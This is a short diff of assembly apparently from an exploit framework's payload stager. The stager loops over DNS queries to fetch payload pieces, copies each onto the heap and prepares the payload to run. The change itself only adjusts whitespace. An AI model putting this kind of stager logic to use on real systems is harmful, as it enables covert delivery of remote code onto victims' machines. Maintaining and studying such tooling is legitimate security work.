@@ -240,10 +240,10 @@ copy_piece_to_heap:
 	rep movsb		; copy from ESI to EDI
 	push edi		; save target for next copy
 	push edi		; 2 more times to make sure it's at esp+8
-	push edi		; 
+	push edi		;
 	inc ebx			; increment sequence
 	xchg #{bufferreg},edx	; restore start of heap
-	jmp dnsquery		; try to get the next piece, if any
+	jmp dnsquery	; try to get the next piece, if any
 
 prepare_payload:
 	mov #{bufferreg},edx
